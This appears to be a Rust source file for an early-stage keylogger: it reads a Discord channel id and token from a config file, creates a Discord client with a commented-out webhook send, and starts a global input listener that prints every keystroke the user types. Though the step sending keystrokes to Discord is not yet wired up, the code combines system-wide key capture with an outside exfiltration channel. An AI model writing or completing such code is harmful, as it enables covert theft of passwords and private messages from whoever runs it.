mod discord;
use discord::Discord;
use std::fs;
use serde::{Deserialize, Serialize};
use rdev::{listen, Event};

fn callback(event: Event) {
    println!("My callback {:?}", event);
    match event.name {
        Some(string) => println!("User wrote {:?}", string),
        None => (),
    }
}

#[derive(Deserialize, Serialize)]
struct Config {
    channel_id: String,
    token: String,
}

fn main() {

    // loading config

    let file_content: String = fs::read_to_string("./src/config.json").expect("Couldn't read file content.");
    let file_content_as_str: &str = file_content.as_str();
    let config: Config = serde_json::from_str(file_content_as_str).expect("Couldn't parse JSON.");

    // creating the discord client

    let discord_client: Discord = Discord::new(config.channel_id.as_str(), config.token.as_str());

    // sending a test message

    //discord_client.send_webhook("Hello, Rust !");

    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error);
    }
}